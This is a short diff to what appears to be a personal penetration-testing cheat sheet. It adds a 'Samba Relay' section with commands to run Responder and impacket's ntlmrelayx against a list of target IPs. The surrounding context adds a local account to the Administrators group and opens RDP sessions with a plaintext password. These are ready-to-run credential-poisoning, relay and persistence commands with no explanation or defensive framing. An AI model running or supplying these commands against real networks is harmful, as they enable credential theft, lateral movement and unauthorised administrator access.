@@ -37,3 +37,10 @@ net localgroup Administrators usuario /add
 # Connect Linux client
 xfreerdp /u:usuario /d:WORKGROUP /p:123456789a* /v:10.10.10.81 
 proxychains rdesktop 10.65.200.38 -u administrator -g 1200x800 
+
+==============================================================================
+[+] Enable Samba Relay
+==============================================================================
+sudo python3 Responder.py -I tun0
+sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf ips.txt -smb2support
+
